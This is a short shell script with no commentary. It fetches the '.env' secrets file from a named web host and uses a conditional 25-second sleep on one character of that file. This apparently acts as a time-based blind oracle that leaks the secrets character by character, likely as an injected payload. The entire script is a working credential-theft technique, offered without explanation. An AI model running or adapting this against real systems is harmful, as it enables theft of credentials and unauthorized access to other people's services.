#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +13 /wa|head -c1)" < 'y' ]&&sleep 25
sleep 12
